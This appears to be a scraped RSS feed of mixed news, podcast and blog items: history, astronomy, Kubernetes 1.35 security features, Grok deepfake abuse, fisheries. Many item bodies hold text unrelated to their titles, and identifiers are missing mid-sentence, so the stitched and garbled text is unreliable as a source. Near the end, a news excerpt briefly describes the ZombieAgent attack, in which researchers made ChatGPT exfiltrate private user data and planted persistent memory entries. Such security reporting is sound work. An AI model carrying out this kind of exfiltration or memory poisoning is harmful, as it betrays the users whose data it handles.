Following the colonists' Declaration of Independence in July, the British aimed to crush the rebellion by seizing New York City, a strategic port and economic hub. Under General William Howe, a massive British force—over 32,000 troops, supported by the Royal Navy's fleet—arrived in New York Harbor in late June. This armada, one of the largest ever assembled at the time, dwarfed the Continental Army led by General George Washington, which numbered around 19,000 mostly inexperienced soldiers.

The invasion began with the Battle of Long Island on August 27, 1776. British forces outflanked Washington's defenses at Brooklyn Heights, inflicting heavy casualties—over 1,000 American dead or wounded compared to just 400 British losses. Washington narrowly escaped total defeat by orchestrating a daring nighttime evacuation across the East River, saving his army under the cover of fog. The British then pursued, capturing Manhattan in the Battle of Kip's Bay on September 15 and the Battle of Harlem Heights the next day, though the latter was a minor American victory that boosted morale.

By November, Howe had taken Fort Washington and Fort Lee, forcing Washington to retreat across New Jersey. The British occupation of New York lasted until the war's end in 1783, serving as their main base. This campaign exposed the Continental Army's vulnerabilities but also highlighted Washington's resilience, setting the stage for future guerrilla tactics and alliances, like with France. Ultimately, while a British triumph, it failed to end the revolution, as American forces regrouped and fought on.]]></content:encoded></item><item><title>Jonathan Schooler - Panpsychism: Arguing Pro and Con</title><link>https://www.youtube.com/watch?v=jk5m1lyYJoo</link><author>Closer To Truth</author><category>podcast</category><enclosure url="https://www.youtube.com/v/jk5m1lyYJoo?version=3" length="" type=""/><pubDate>Sat, 10 Jan 2026 16:01:20 +0000</pubDate><source url="https://www.youtube.com/channel/UCl9StMQ79LtEvlrskzjoYbQ">Podcast - Closer to Truth</source><content:encoded><![CDATA[Subscribe to the Closer To Truth podcast on Apple, Spotify, or wherever you get your podcasts: https://shorturl.at/mtJP4

Panpsychism is the theory that consciousness is irreducible and exists fundamentally at the foundations of reality. Panpsychism forms include ‘micropsychism,’ where fundamental particles or fields are in some sense conscious, and ‘Cosmopsychism,’ where the entire universe is in some sense conscious. What are the arguments for and against Panpsychism like the ‘combination problem’?

Here are the studies this week that lurked in the dark, pulsated with light, wagged a tail, and called it a night.First, scientists have yet again spotted a bizarre object in space that has never been seen before—the universe just keeps serving them up. Then: news from the biggest star in the sky, a tale of eavesdropping dogs, and a jellyfish sleepover.You don’t want to be on this Cloud-9 Astronomers have glimpsed a new type of cosmic object—a starless clump of dark matter that never quite worked up the oomph to become a galaxy. Known as Cloud-9, the entity is located about 14 million light years away and likely provides the first look at an ancient dark matter halo.Dark matter, as you may have heard, is weird stuff that has never been directly detected or identified, but nonetheless accounts for almost all matter in the universe. In the early universe, clumps of dark matter formed halos that attracted gas, sparked star formation, and evolved into the first galaxies. But while all galaxies appear to have dark matter halos, not all dark matter halos turned into galaxies.Scientists have long speculated that some halos may have never accumulated the right amount of mass to make a star-studded galaxy. For years, astronomers have searched for the gravitational signatures of these dark starless “,” which are known as Reionization-Limited H I Clouds (RELHICs). Now, a team reports that the first clear RELHIC candidate ever discovered, providing support for the standard model of cosmology, also known as the Lambda cold dark matter (ΛCDM) model, which is the current working framework of the universe. “The abundance of halos far exceeds that of known galaxies, implying that not all halos are able to host luminous galaxies,” said researchers led by Gagandeep S. Anand of the Space Telescope Science Institute in Baltimore. “This has been interpreted to mean that galaxies only form in halos that exceed a ‘critical’ mass.’” “Our results make Cloud-9 the leading RELHIC candidate,” the team continued. “This provides strong support for a cornerstone prediction of the Lambda cold dark matter model, namely the existence of gas-filled starless dark matter halos on subgalactic mass scales, and constrains the present-day threshold halo mass for galaxy formation.”Cloud-9 might one day accumulate enough mass to pass the threshold for star formation, allowing it to eventually graduate into a galaxy. But for now, it is a galaxy school flunkie.  WOH G64, one of the largest stars in the sky, is nearing its death. At about 2,000 times the size of the Sun, this supergiant would extend beyond Saturn if it were placed in our solar system. Scientists have speculated that the recent dimming of the senescent star might signal a transition from a red supergiant to a yellow hypergiant, making it one step closer to supernova. But a new study reveals evidence that WOH G64 “is currently a red supergiant” and its changing light may be influenced by a companion star in orbit around it, making this a binary system.“For a long time, WOH G64 was known as the most extreme red supergiant outside our Galaxy,” said researchers led by Jacco Th. van Loon of Keele University. “However, in a matter of years it has faded” and “its pulsations have become suppressed.”“We have presented evidence that the remarkable changes witnessed in the 21st-century in the optical brightness and spectrum of the most extreme known extragalactic red supergiant, WOH G64 may be due to binary interaction,” the team continued, noting that “we may be witnessing the birth of a…supernova progenitor.”Fortunately, this time bomb is located 160,000 light years away, so we are well beyond the blast radius. Whenever WOH G64 does explode, the supernova could be bright enough to see with the naked eye from Earth, despite its location far outside the Milky Way.It’s not your imagination: Your dog might actually be a really good listener. While it’s well-known that dogs respond to a variety of commands, researchers have now demonstrated that some pooches, known as Gifted Word Learners, can pick up new words just by passively overhearing their owners’ conversations.Over a series of experiments, researchers gave dogs fun toys to play with, which their owners then named in conversations that were not directed at the dogs. The pets were then able to identify the toys by the labels at a rate significantly above what would be expected by chance, even though they had never been directly taught the words. The findings suggest that some dogs may have sociocognitive skills parallel to young toddlers, and further confirms that a variety of animals can demonstrate various degrees of language comprehension. But the best part is the following detail about how the effervescent joy of dogs was accounted for in the experimental design.“Because dogs are neophilic and often get excited by new toys, we gave them ample opportunities to interact with the toys without hearing their labels,” said researchers led by Shany Dror of University of Veterinary Medicine in Vienna. Science completed? Check. Dogs got loads of playtime? Check. Win-win.Jellyfish naps > cat napsWe’ll close by yawning and going back to bed—a waterbed in this case, because this is a story about the sleep cycles of marine animals. To probe the broader evolutionary purpose of sleep, scientists monitored periods of slumber and wakefulness in the upside-down jellyfishand the anemone . The results revealed that these animals had remarkably similar sleeping habits to people. “Like humans, both species require a total of approximately 8 hours of sleep per day,” said researchers led by Raphaël Aguillon, who conducted the work at Bar-Ilan University, and is now at IBPC Paris-Sorbonne University. “Notably, similar to findings in primates and flies, a midday nap was also observed in ,” the team added. Talk about sleeping with the fishes! The upshot of the study is that sleep has evolved across all animals with a nervous system to help repair damaged DNA, a benefit that is apparently worth the vulnerability of a resting state. But for our weekend purposes, my takeaway is that even jellyfish enjoy a midday nap, so go ahead and take that siesta.    Thanks for reading! See you next week.]]></content:encoded></item><item><title>Nvidia’s New Rubin Architecture Thrives on Networking</title><link>https://spectrum.ieee.org/nvidia-rubin-networking</link><author>Dina Genkina</author><category>tech</category><enclosure url="https://spectrum.ieee.org/media-library/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpbWFnZSI6Imh0dHBzOi8vYXNzZXRzLnJibC5tcy82MjY5NzE1Ni9vcmlnaW4uanBnIiwiZXhwaXJlc19hdCI6MTgzMTU2ODI3MX0.ECyKUNYbM4gqt0Ler8ljGjy5biY4z2f1MXmr8MoD8p4/image.jpg?width=600" length="" type=""/><pubDate>Sat, 10 Jan 2026 14:00:02 +0000</pubDate><source url="https://spectrum.ieee.org/">IEEE Spectrum</source><content:encoded><![CDATA[Some computations happen while data is en route]]></content:encoded></item><item><title>&quot;Battle-worn&quot;, field-modified Cherry G80-0486H/03 keyboard review (Cherry M8)</title><link>https://www.youtube.com/watch?v=Oz-hhy1Zap4</link><author>Chyrosran22</author><category>yt</category><enclosure url="https://www.youtube.com/v/Oz-hhy1Zap4?version=3" length="" type=""/><pubDate>Sat, 10 Jan 2026 06:00:32 +0000</pubDate><source url="https://www.youtube.com/channel/UCD0y51PJfvkZNe3y3FR5riw">Chyrosran22</source><content:encoded><![CDATA[Skip to 8:03 for a typing demonstration.

But then the Silkposting and CoD: Ghosts panels were approved for PAX East, so I had to pivot to working on those, and then I promised the final Ghosts video to PAX West as a live premiere, so Jarhead got kicked even further down the road, and then I got invited to a tour of Mr. Beast's studio which I absolutely couldn't turn down because I just could not figure out how they even got my name, so 2025 was a weird year.

scripts, with the full privileges of the invoking user, and without your
knowledge? Whenever you download or auto-generate a , the
 field can specify an executable to fetch credentials on
your behalf. Don't get me wrong, this is an incredible feature that allows you
to authenticate to the cluster with external identity providers. Nevertheless,
you probably see the problem: Do you know exactly what executables your 
is running on your system? Do you trust the pipeline that generated your ?
If there has been a supply-chain attack on the code that generates the kubeconfig,
or if the generating pipeline has been compromised, an attacker might well be
doing unsavory things to your machine by tricking your  into running
arbitrary code.To give the user more control over what gets run on their system, SIG-Auth and SIG-CLI added the credential plugin policy and allowlist as a beta feature to
Kubernetes 1.35. This is available to all clients using the  library,
by filling out the ExecProvider.PluginPolicy struct on a REST config. To
broaden the impact of this change, Kubernetes v1.35 also lets you manage this without
writing a line of application code. You can configure  to enforce
the policy and allowlist by adding two fields to the  configuration
file:  and credentialPluginAllowlist. Adding one or
both of these fields restricts which credential plugins  is allowed to execute.A full description of this functionality is available in our official documentation for kuberc,
but this blog post will give a brief overview of the new security knobs. The new
features are in beta and available without using any feature gates.The following example is the simplest one: simply don't specify the new fields.This will keep  acting as it always has, and all plugins will be
allowed.The next example is functionally identical, but it is more explicit and
therefore preferred if it's actually what you want:If you  whether or not you're using exec credential plugins, try
setting your policy to :If you  using credential plugins, you'll quickly find out what  is
trying to execute. You'll get an error like the following.Unable to connect to the server: getting credentials: plugin "cloudco-login" not allowed: policy set to "DenyAll"If there is insufficient information for you to debug the issue, increase the
logging verbosity when you run your next command. For example:Selectively allowing pluginsWhat if you need the  plugin to do your daily work? That is why
there's a third option for your policy, . To allow a specific plugin,
set the policy and add the credentialPluginAllowlist:You'll notice that there are two entries in the allowlist. One of them is
specified by full path, and the other,  is just a basename. When
you specify just the basename, the full path will be looked up using
, which does not expand globbing or handle wildcards.
Globbing is not supported at this time. Both forms
(basename and full path) are acceptable, but the full path is preferable because
it narrows the scope of allowed binaries even further.Currently, an allowlist entry has only one field, . In the future, we
(Kubernetes SIG CLI) want to see other requirements added. One idea that seems
useful is checksum verification whereby, for example, a binary would only be allowed
to run if it has the sha256 sum
b9a3fad00d848ff31960c44ebb5f8b92032dc085020f857c98e32a5d5900ff9c
exists at the path .Another possibility is only allowing binaries that have been signed by one of a
set of a trusted signing keys.The credential plugin policy is still under development and we are very interested
in your feedback. We'd love to hear what you like about it and what problems
you'd like to see it solve. Or, if you have the cycles to contribute one of the
above enhancements, they'd be a great way to get started contributing to
Kubernetes.

Our capacity, as conscious subjects, to make things explicit, so that what-is presents itself as “that-it-is” or “that-it-is-the-case” is at the heart of the mystery of human being. Philosopher Raymond Tallis explores how explicitness connects with fundamental ontological, metaphysical, and epistemological questions.

Tallis' latest book, "Circling Round Explicitness: The Heart of the Mystery of Human Being", is available for purchase now: https://amzn.to/3MUX5Ke

Raymond Tallis trained in medicine at Oxford University and at St Thomas’ Hospital London before becoming Professor of Geriatric Medicine at the University of Manchester. He was elected a Fellow of the Academy of Medical Sciences for his research in clinical neuroscience. He retired from medicine in 2006 to become a full-time writer. His books have ranged across many subjects—from philosophical anthropology to literary and cultural criticism—but all are characterized by a fascination for the infinite complexity of human lives and the human condition. The Economist’s Intelligent Life magazine lists him as one of the world’s leading polymaths.

DESCRIPTION
Maurice Naftalin and Stuart Marks discuss the second edition of "Java Generics and Collections", published 19 years after the original. The conversation explores how Java programming has evolved from Java 5 to Java 25, covering major shifts like the move toward immutability, the introduction of sequenced collections, streams, and unmodifiable collections.

They delve into critical design topics including encapsulation of collections, the anemic domain model anti-pattern, the controversial unsupported operation exception, and the challenges of null handling. The book includes new chapters on usage guidance and design retrospectives that reflect decades of accumulated wisdom about the Collections Framework.

Though it’s unclear who, if anyone, will take part in his plan, Chevron is already there.

After the US attack on the South American country and its rendition of President Nicolás Maduro, Trump said he wants to rebuild the country’s beleaguered infrastructure. While the oil majors mull his entreaties, Chevron may have a distinct advantage since it’s been operating in Venezuela for decades.

At its height, the city’s famous library housed nearly one million texts, and attracted thinkers like Hypatia of Alexandria, Euclid and Heron (who invented the steam engine). This episode tells the story of this incredible site of knowledge and culture, taking in its epic founding, the rise of Christianity and its impact on the city, its fate during the Crusades, the coming of Napoleon, and its role in the rise of the Arab nationalism movement.This is a radio edit of the original podcast episode.

Vance, during a lengthy appearance in the White House briefing room on Thursday, defended the Immigration and Customs Enforcement officer and criticized the woman who was killed, Renee Nicole Good, calling her a “victim of left-wing ideology.”

The Department of Homeland Security said the agent fired in self-defense after Good attempted to run over officers, but state and city officials have disputed that version of events after videos on social media raised questions about whether Good was attempting to flee the scene rather than harm anyone.

Some officials in ICE’s headquarters were alarmed that the leadership in the Trump administration quickly labeled the incident an act of “domestic terrorism,” rather than waiting to conduct an investigation into the incident, according to people familiar with the matter. Officials internally passed around an interview with border czar Tom Homan on CBS News, in which he said he would reserve judgment while an investigation was under way, the people said.

dates back to Kubernetes v1.10.
It is widely used to express that volumes may not be equally accessible by all nodes in the cluster.
This field was previously immutable,
and it is now mutable in Kubernetes v1.35 (alpha). This change opens a door to more flexible online volume management.Why make node affinity mutable?This raises an obvious question: why make node affinity mutable now?
While stateless workloads like Deployments can be changed freely
and the changes will be rolled out automatically by re-creating every Pod,
PersistentVolumes (PVs) are stateful and cannot be re-created easily without losing data.However, Storage providers evolve and storage requirements change.
Most notably, multiple providers are offering regional disks now.
Some of them even support live migration from zonal to regional disks, without disrupting the workloads.
This change can be expressed through the
VolumeAttributesClass API,
which recently graduated to GA in 1.34.
However, even if the volume is migrated to regional storage,
Kubernetes still prevents scheduling Pods to other zones because of the node affinity recorded in the PV object.
In this case, you may want to change the PV node affinity from:As another example, providers sometimes offer new generations of disks.
New disks cannot always be attached to older nodes in the cluster.
This accessibility can also be expressed through PV node affinity and ensures the Pods can be scheduled to the right nodes.
But when the disk is upgraded, new Pods using this disk can still be scheduled to older nodes.
To prevent this, you may want to change the PV node affinity from:So, it is mutable now, a first step towards a more flexible online volume management.
While it is a simple change that removes one validation from the API server,
we still have a long way to go to integrate well with the Kubernetes ecosystem.This feature is for you if you are a Kubernetes cluster administrator,
and your storage provider allows online update that you want to utilize,
but those updates can affect the accessibility of the volume.Note that changing PV node affinity alone will not actually change the accessibility of the underlying volume.
Before using this feature,
you must first update the underlying volume in the storage provider,
and understand which nodes can access the volume after the update.
You can then enable this feature and keep the PV node affinity in sync.Currently, this feature is in alpha state.
It is disabled by default, and may subject to change.
To try it out, enable the  feature gate on APIServer, then you can edit the PV  field.
Typically only administrators can edit PVs, please make sure you have the right RBAC permissions.Race condition between updating and schedulingThere are only a few factors outside of a Pod that can affect the scheduling decision, and PV node affinity is one of them.
It is fine to allow more nodes to access the volume by relaxing node affinity,
but there is a race condition when you try to tighten node affinity:
it is unclear how the Scheduler will see the modified PV in its cache,
so there is a small window where the scheduler may place a Pod on an old node that can no longer access the volume.
In this case, the Pod will stuck at  state.One mitigation currently under discussion is for the kubelet to fail Pod startup if the PersistentVolume’s node affinity is violated.
This has not landed yet.
So if you are trying this out now, please watch subsequent Pods that use the updated PV,
and make sure they are scheduled onto nodes that can access the volume.
If you update PV and immediately start new Pods in a script, it may not work as intended.Future integration with CSI (Container Storage Interface)Currently, it is up to the cluster administrator to modify both PV's node affinity and the underlying volume in the storage provider.
But manual operations are error-prone and time-consuming.
It is preferred to eventually integrate this with VolumeAttributesClass,
so that an unprivileged user can modify their PersistentVolumeClaim (PVC) to trigger storage-side updates,
and PV node affinity is updated automatically when appropriate, without the need for cluster admin's intervention.As noted earlier, this is only a first step.If you are a Kubernetes user,
we would like to learn how you use (or will use) PV node affinity.
Is it beneficial to update it online in your case?If you are a CSI driver developer,
would you be willing to implement this feature? How would you like the API to look?Please provide your feedback via:For any inquiries or specific questions related to this feature, please reach out to the SIG Storage community.]]></content:encoded></item><item><title>Hitler&apos;s Dip!@#$ Dad | Worst Dads in History</title><link>https://www.youtube.com/shorts/52Xq8BPm2Ig</link><author>Extra History</author><category>yt</category><enclosure url="https://www.youtube.com/v/52Xq8BPm2Ig?version=3" length="" type=""/><pubDate>Thu, 8 Jan 2026 18:29:46 +0000</pubDate><source url="https://www.youtube.com/channel/UCCODtTcd5M1JavPCOr_Uydg">Extra History</source><content:encoded><![CDATA[📚 For more Historical Tales with Nazi Occultism, why not check out our series on Hitler vs Magic here: https://youtu.be/06fXIstwddk

This plan was not a single document but a multifaceted response to events like the Boston Tea Party (1773) and the First Continental Congress (1774), culminating in the outbreak of war.

The year began with the Battles of Lexington and Concord in April 1775, where British troops attempted to seize colonial arms, igniting armed conflict. King George, viewing the colonies as traitorous, rejected olive branches like the Olive Branch Petition from the Second Continental Congress in July. Instead, on August 23, 1775, he issued the Proclamation of Rebellion, officially declaring the American colonies in open rebellion against the Crown. This decree urged loyal subjects to suppress the uprising and authorized military force, effectively labeling colonial leaders as traitors.

George's plan involved mobilizing a massive military response: deploying over 30,000 British troops, hiring Hessian mercenaries (German auxiliaries), and blockading American ports with the Royal Navy to starve the colonies economically. He aimed to isolate New England, the rebellion's hotbed, and divide the colonies through divide-and-conquer tactics. Domestically, he suppressed pro-American sentiments in Britain via censorship and propaganda.

However, the plan backfired, unifying colonists and leading to the Declaration of Independence in 1776. George's inflexibility, influenced by hardline advisors like Lord North, prolonged the war, costing Britain dearly. This "massive plan" symbolized imperial overreach, fueling America's fight for independence and reshaping global history.

People are endlessly prompting Grok to make nude and semi-nude images of women and girls, without their consent, directly on their X feeds and in their replies. Sometimes I feel like I’ve said absolutely everything there is to say about this topic. I’ve been writing about nonconsensual synthetic imagery before we had half a dozen different acronyms for it, before people called it “deepfakes” and way before “cheapfakes” and “shallowfakes” were coined, too. Almost nothing about the way society views this material has changed in the seven years since it’s come about, because fundamentally—once it’s left the camera and made its way to millions of people’s screens—the behavior behind sharing it is not very different from images made with a camera or stolen from someone’s Google Drive or private OnlyFans account. We all agreed in 2017 that making nonconsensual nudes of people is gross and weird, and today, occasionally, someone  for it, but otherwise the industry is bigger than ever. What’s happening on X right now is an escalation of the way it’s always been, and almost everywhere on the internet.Do you know anything else about what's going on inside X? Or are you someone who's been targeted by abusive AI imagery? I would love to hear from you. Using a non-work device, you can message me securely on Signal at sam.404.

Nets are banned. Every catch is monitored and recorded. 

But despite their efforts to keep fishing as selective and sustainable as possible, the Azores fishermen are struggling to make ends meet. Because of overfishing, the EU imposed fishing quotas that could run them out of business. 

Local fishermen say they are frustrated because it’s not their fault the quotas have to be implemented. They say waters are depleted thanks to industrial fishing fleets casting out gigantic purse seine nets further out at sea, where they can easily evade monitoring.

Researchers discover a vulnerability and exploit it to do something bad. The platform introduces a guardrail that stops the attack from working. Then, researchers devise a simple tweak that once again imperils chatbot users.The reason more often than not is that AI is so inherently designed to comply with user requests that the guardrails are reactive and ad hoc, meaning they are built to foreclose a specific attack technique rather than the broader class of vulnerabilities that make it possible. It’s tantamount to putting a new highway guardrail in place in response to a recent crash of a compact car but failing to safeguard larger types of vehicles.Enter ZombieAgent, son of ShadowLeakOne of the latest examples is a vulnerability recently discovered in ChatGPT. It allowed researchers at Radware to surreptitiously exfiltrate a user's private information. Their attack also allowed for the data to be sent directly from ChatGPT servers, a capability that gave it additional stealth, since there were no signs of breach on user machines, many of which are inside protected enterprises. Further, the exploit planted entries in the long-term memory that the AI assistant stores for the targeted user, giving it persistence.]]></content:encoded></item><item><title>Hacking AI Systems: How to (Still) Trick Artificial Intelligence • Katharine Jarmul • GOTO 2025</title><link>https://www.youtube.com/watch?v=lz0L0rRV7RE</link><author>GOTO Conferences</author><category>yt</category><enclosure url="https://www.youtube.com/v/lz0L0rRV7RE?version=3" length="" type=""/><pubDate>Thu, 8 Jan 2026 13:01:39 +0000</pubDate><source url="https://www.youtube.com/channel/UCs_tLP3AiwYKwdUHpltJPuA">GOTO Conferences</source><content:encoded><![CDATA[This presentation was recorded at GOTO Copenhagen 2025. #GOTOcon #GOTOcph

It’s a New Year’s correspondence special this week on the Take. Simon and Mark will be breaking open our bursting postbag and cracking into your excellent emergency mails from across the holiday period. We’ll be hearing your top takes on the films that made your festive breaks—and one repentant confession from the poor soul who made the mistake of watching The Lighthouse with their granny...   
We’ve got reviews of the freshest films from 2026’s first week too. First up it’s Becoming Victoria Wood, a documentary looking for the true personality behind the comedy persona of the national treasure. Plus you’ll hear Mark’s verdict on the new British boxing drama GIANT—which follows the true story of ring star Naseem Hamed (Amir El-Masry) and his fractious relationship with trainer Brendan Ingle, played by Pierce Brosnan.  
Not forgetting the much-anticipated Hamnet—the Chloé Zhao-directed biopic of William Shakespeare and his family during a period of personal turmoil and tragedy—based on Maggie O’Farrell’s bestselling novel.  It’s already tipped for awards success—especially for lead performances by Jessie Buckley and Paul Mescal—but do the Good Doctors believe the hype?

Teams work across different operating systems, chip architectures, and cloud environments, each with its own dependency quirks and version mismatches. Ensuring that code runs reproducibly across these environments has become a major challenge that’s made even harder by growing concerns around software supply chain security.Nix is a powerful open-source package manager that builds software in controlled, declarative environments where dependencies are explicitly defined and reproducible. Its functional approach has made it a gold standard for reproducible builds, but it can also be difficult to learn and adopt.Flox is a company that builds on top of Nix, with increased supply chain security and abstractions that streamline the developer experience.Michael Stahnke is the VP of Engineering at Flox and formerly worked at companies including Caterpillar, Puppet, and CircleCI. He joins the podcast with Kevin Ball to talk about Flox, building on top of Nix, how reproducibility underpins software security, the concept of “secure by construction, how deterministic environments are reshaping both human and AI-driven development, and much more.Full Disclosure: This episode is sponsored by Flox.Kevin Ball or KBall, is the vice president of engineering at Mento and an independent coach for engineers and engineering leaders.

Fresh from its victory over Athens in the year 404, Sparta stood unrivalled. Yet within decades, its power would be shattered, its authority broken, and its golden age over. From decisive battles against resurgent rivals Thebes and Corinth to over-ambitious kings and a defining clash with a warband of sacred lovers, it is a gripping story of sky-high stakes and two-faced duplicity; of brutal power struggles and the cut-throat scramble to become the hegemonic power of ancient Greece.Sparta vs Athens: The Greek World WarPresented by Tristan Hughes.

Known to history as the Sun King, his 72-year rule stands as the longest reign in history and the ultimate symbol of Absolute Monarchy in Europe.

This biography explores how Louis transformed a humble hunting lodge into the magnificent Palace of Versailles, creating a gilded cage for the French nobility and establishing France as the dominant global power. From the chaos of the Frondes to the War of the Spanish Succession, we examine the military campaigns, court scandals, and political intrigues of the Bourbon Dynasty.

Was he a divinely appointed leader or a tyrant who paved the way for revolution? Witness the rise of the man who declared "L'État, c'est moi" (I am the State) and became a titan of French history. Join The People Profiles as we uncover the life of the King who tried to rule the world.

Kubernetes v1.35 brings a refinement you'll want to know about.
Since the introduction of the TokenRequests feature,
service account tokens requested by CSI drivers have been passed to them through the  field.
While this has worked, it's not the ideal place for sensitive information,
and we've seen instances where tokens were accidentally logged in CSI drivers.Kubernetes v1.35 introduces a beta solution to address this:
CSI Driver Opt-in for Service Account Tokens via Secrets Field.
This allows CSI drivers to receive service account tokens
through the  field in ,
which is the appropriate place for sensitive data in the CSI specification.Understanding the existing approachWhen CSI drivers use the TokenRequests feature,
they can request service account tokens for workload identity
by configuring the  field in the CSIDriver spec.
These tokens are passed to drivers as part of the volume attributes map,
using the key csi.storage.k8s.io/serviceAccount.tokens.The  field works, but it's not designed for sensitive data.
Because of this, there are a few challenges:First, the  tool that CSI drivers use doesn't treat volume context as sensitive,
so service account tokens can end up in logs when gRPC requests are logged.
This happened with CVE-2023-2878 in the Secrets Store CSI Driver
and CVE-2024-3744 in the Azure File CSI Driver.Second, each CSI driver that wants to avoid this issue needs to implement its own sanitization logic,
which leads to inconsistency across drivers.The CSI specification already has a  field in 
that's designed exactly for this kind of sensitive information.
The challenge is that we can't just change where we put the tokens
without breaking existing CSI drivers that expect them in volume context.How the opt-in mechanism worksKubernetes v1.35 introduces an opt-in mechanism that lets CSI drivers choose
how they receive service account tokens.
This way, existing drivers continue working as they do today,
and drivers can move to the more appropriate secrets field when they're ready.CSI drivers can set a new field in their CSIDriver spec:The behavior depends on the serviceAccountTokenInSecrets field:When set to  (the default), tokens are placed in  with the key csi.storage.k8s.io/serviceAccount.tokens, just like today.
When set to , tokens are placed only in the  field with the same key.The CSIServiceAccountTokenSecrets feature gate is enabled by default
on both kubelet and kube-apiserver.
Since the serviceAccountTokenInSecrets field defaults to ,
enabling the feature gate doesn't change any existing behavior.
All drivers continue receiving tokens via volume context unless they explicitly opt in.
This is why we felt comfortable starting at beta rather than alpha.Guide for CSI driver authorsIf you maintain a CSI driver that uses service account tokens, here's how to adopt this feature.First, update your driver code to check both locations for tokens.
This makes your driver compatible with both the old and new approaches:This fallback logic is backward compatible and safe to ship in any driver version,
even before clusters upgrade to v1.35.CSI driver authors need to follow a specific sequence when adopting this feature to avoid breaking existing volumes. (can happen anytime)You can start preparing your driver right away by adding fallback logic that checks both the secrets field and volume context for tokens.
This code change is backward compatible and safe to ship in any driver version, even before clusters upgrade to v1.35.
We encourage you to add this fallback logic early, cut releases, and even backport to maintenance branches where feasible.Cluster upgrade and feature enablementOnce your driver has the fallback logic deployed, here's the safe rollout order for enabling the feature in a cluster:Complete the kube-apiserver upgrade to 1.35 or laterComplete kubelet upgrade to 1.35 or later on all nodesEnsure CSI driver version with fallback logic is deployed (if not already done in preparation phase)Fully complete CSI driver DaemonSet rollout across all nodesUpdate your CSIDriver manifest to set serviceAccountTokenInSecrets: trueThe most important thing to remember is timing.
If your CSI driver DaemonSet and CSIDriver object are in the same manifest or Helm chart,
you need two separate updates.
Deploy the new driver version with fallback logic first,
wait for the DaemonSet rollout to complete,
then update the CSIDriver spec to set serviceAccountTokenInSecrets: true.Also, don't update the CSIDriver before all driver pods have rolled out.
If you do, volume mounts will fail on nodes still running the old driver version,
since those pods only check volume context.Adopting this feature helps in a few ways:It eliminates the risk of accidentally logging service account tokens as part of volume context in gRPC requestsIt uses the CSI specification's designated field for sensitive data, which feels rightThe  tool automatically handles the secrets field correctly, so you don't need driver-specific workaroundsIt's opt-in, so you can migrate at your own pace without breaking existing deploymentsWe (Kubernetes SIG Storage) encourage CSI driver authors to adopt this feature and provide feedback
on the migration experience.
If you have thoughts on the API design or run into any issues during adoption,
please reach out to us on the

2025 was a year of photography that didn't go as planned. There were a lot of things that I wanted to do, that I did very little of. As a result, I learned, or was reminded of a few important lessons that have become my focus moving forward, and have also inspired some recent changes I've made to my photography approach and business, including moving into a new studio space. In this video, I'm going to talk about those three lessons in hopes that they maybe help you out with your work in one way or another. I'll also give you a quick tour of the new studio!

Trees are among the most fascinating life forms on Earth, but what makes them truly fascinating is hiding underground! They are able to break solid rocks with hydraulic roots, all while working together with the underground fungal networks that can stretch for kilometers. Above and below, trees are running biological empires we’re only beginning to understand.

How does something so massive survive with roots growing so shallow? What are trees really made of and how are they able to grow so big?

Embeth's directorial debut, DON'T LETS GO TO THE DOGS TONIGHT (an adaptation of the book of the same name written by Alexandra Fuller), is one of our favourite films from this past year, and we spend most of our conversation learning how Embeth pulled it off. The film is centered around the experiences of a young white child living in Zimbabwe at the end of the Rhodesian Bush War, and Embeth shares how her own childhood memories of South Africa's Apartheid influenced her telling of the story. Among many topics, we discuss: the film's effective use of voiceover, Embeth's approach to directing the lead child actress, managing a monkey break-in on location, the deceptive allure of the Steadicam, how the movie was financed, and whether or not she considered changing the title. We also reflect on the challenges of navigating a career in the entertainment industry, and we learn what Embeth has planned next.Recommended viewing: DON'T LETS GO TO THE DOGS TONIGHTThis episode is sponsored by Aputure]]></content:encoded></item><item><title>GOTO Copenhagen 2025 Aftermovie</title><link>https://www.youtube.com/watch?v=Ra2F0HQKVS0</link><author>GOTO Conferences</author><category>yt</category><enclosure url="https://www.youtube.com/v/Ra2F0HQKVS0?version=3" length="" type=""/><pubDate>Wed, 7 Jan 2026 10:24:29 +0000</pubDate><source url="https://www.youtube.com/channel/UCs_tLP3AiwYKwdUHpltJPuA">GOTO Conferences</source><content:encoded><![CDATA[This video was recorded at GOTO Copenhagen 2025. #GOTOcon #GOTOcph

(Aired 2021)

This short documentary from FRONTLINE, Retro Report and ProPublica examined the horrors of what happened when U.S.-trained and equipped Salvadoran soldiers killed some 1,000 civilians, many of them children, in an attack more than 40 years ago. In the documentary, Raymond Bonner — who was one of the first journalists to bear witness to the aftermath of the massacre — recounted the experience of reporting the story and spoke with survivors of the attack.

This on-the-ground investigation detailed how, for decades following the tragedy, there was little movement towards holding anyone accountable, and how the case against high-ranking military officials faltered under Salvadoran President Nayib Bukele. 

“Massacre in El Salvador” laid bare the nation’s grisly past and the decades-long struggle for justice.

“Massacre in El Salvador” is a FRONTLINE and Retro Report production with ProPublica. The producer and writer is Kit R. Roane. The senior producers are Frank Koughan and Molly Knight Raskin. The executive producer of Retro Report is Kyra Darnton.

Pollution, overfishing and climate change are depleting its oxygen. The crisis became visible when a thick layer of algal slime first began spreading across its waters in 2021.

Necla Köseoğlu, from Rumelikavağı, is one of the last people still working in traditional small-scale fishing on Turkey's Sea of Marmara. She's also one of the few women in the business. She used to be able to live off what she made from fishing, but those days are gone. Fish stocks in the Turkish inland sea have declined dramatically. The ecosystem is at risk of collapse due to overfishing, urban and industrial waste, and shipping pollution. The Marmara Sea, whose shores are home to around 25 million people, is suffocating.

The crisis became widely known in 2021, when a kind of slime known as "sea snot" began to cover large parts of the sea's surface. The foul-smelling, gelatinous substance is an organic substance secreted by algae. It's not harmful to humans, but it starves other marine life of oxygen. Professor Hasan Örek is among the marine biologists and oceanographers sounding the alarm.

Istanbul's city government has acknowledged the looming disaster. Environmental engineer Ayşen Erdinçler and her colleague Ilker Aslan say stricter controls and fines will curb pollution from shipping. But those measures are nothing more than a drop in the ocean. The greatest threat comes from millions of cubic meters of untreated domestic and industrial waste discharged into the sea each day. Local wastewater treatment plants urgently need modernization, but the Turkish government lacks the funds to carry it out.

--

400 years ago, Edo was on the verge of ecological collapse. Years of intense logging had led to massive deforestation and the city faced timber shortages, severe erosion, and frequent flooding. But over just a few decades, Edo became one of the most sustainable and efficient cities in history. So, how did this come about? Roman Krznaric explores Edo's transformation into a circular economy.
